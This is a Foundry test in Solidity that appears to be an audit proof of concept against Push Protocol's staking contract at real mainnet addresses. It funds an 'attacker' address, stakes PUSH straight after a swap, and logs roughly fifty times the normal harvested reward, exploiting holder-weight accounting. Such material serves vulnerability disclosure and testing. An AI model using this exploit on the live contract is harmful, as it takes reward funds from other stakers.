// SPDX-License-Identifier: MIT
pragma solidity ^0.6.11;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "contracts/PushCore/EPNSCoreAdmin.sol";
import "contracts/PushCore/EPNSCoreProxy.sol";
import "contracts/PushCore/PushCoreV2.sol";

interface V2Router {
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory amounts);
    function swapExactTokensForTokens(uint amountIn, uint amountOutMin,address[] calldata path,address to,uint deadline) external returns (uint[] memory amounts);
    function WETH() external returns(address);
}
interface IPushCore {
    function harvestAll() external;
    function stake(uint256) external;
    function unstake() external;
    function lastEpochRelative(uint256 _from, uint256 _to) external view returns (uint256);
    function genesisEpoch() external view returns(uint256);
    function harvestPaginated(uint256 _tillEpoch) external;
    function addPoolFees(uint256 _amount) external;
}

contract UpdatedCoreTest is Test {
    PushCoreV2 pushCoreV2;
    IPUSH PUSH_TOKEN = IPUSH(0xf418588522d5dd018b425E472991E52EBBeEEEEE);
    IPushCore PUSH_CORE = IPushCore(0x66329Fdd4042928BfCAB60b179e1538D56eeeeeE);

    V2Router v2Router = V2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address attacker = address(0xbad);
    address proxyAdmin = 0x0be3f9D355140969e74F5a57b1f77b20354C7816;

    uint256 public constant epochDuration = 21 * 7156;

    function WETH() public returns(address) {
        return v2Router.WETH();
    }

    function setUp() external {
        pushCoreV2 = new PushCoreV2();
        vm.deal(attacker, 100 ether);

        // proxy admin
        address admin = address(    
            uint160(
                uint256(
                    vm.load(
                        address(PUSH_CORE),
                        0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103
                    )
                )
            )
        );
        vm.prank(proxyAdmin); // proxy admin's owner
        EPNSCoreAdmin(admin).upgradeAndCall(
            EPNSCoreProxy(payable(address(PUSH_CORE))),
            address(pushCoreV2),
            ""
        );
        
        vm.startPrank(attacker);
        PUSH_TOKEN.approve(address(PUSH_CORE), type(uint256).max);
        IPUSH(address(PUSH_TOKEN)).setHolderDelegation(address(PUSH_CORE), true);
        vm.stopPrank();
    }

    function currentEpoch() public view returns(uint256) {
        uint256 currentEpoch = PUSH_CORE.lastEpochRelative(PUSH_CORE.genesisEpoch(), block.number);
        return currentEpoch;
    }
    function testPush() external {

        address[] memory path = new address[](2);
        path[0] = WETH();
        path[1] = address(PUSH_TOKEN);
        vm.startPrank(attacker);
        v2Router.swapExactETHForTokens{value: 20 ether}(0, path, attacker, block.timestamp);

        /*
        !IMPORTANT!
        * When you call resetHolderWeight, you are assuming a normal user.
        */
        // IPUSH(address(PUSH_TOKEN)).resetHolderWeight(attacker);

        PUSH_CORE.stake(100_000 ether);

        uint256 before = PUSH_TOKEN.balanceOf(attacker);
        // NEXT EPOCH
        vm.roll(block.number + epochDuration + 1);
        console2.log("current epoch of harvesting 1st time: ", currentEpoch());

        PUSH_CORE.harvestAll();
        uint256 afterBal = PUSH_TOKEN.balanceOf(attacker);

        PUSH_CORE.addPoolFees(10_000 ether);

        PUSH_CORE.stake(100_000 ether);

        uint256 beforeT = PUSH_TOKEN.balanceOf(attacker);
        // NEXT EPOCH
        vm.roll(block.number + epochDuration * 10);
        console2.log("current epoch of harvesting 2nd time: ", currentEpoch());

        PUSH_CORE.harvestAll();
        uint256 afterBalT = PUSH_TOKEN.balanceOf(attacker);

        /*
        !RESULT!
        If call resetHolderWeight (assume normal user)
        12.611712076531173

        If don't call resetHolderWeight (stake right after swap)
        623.852725429354
        */
        console2.log("staking reward of first stake", afterBal-before);
        console2.log("staking reward after restake", afterBalT-beforeT);

    }
}
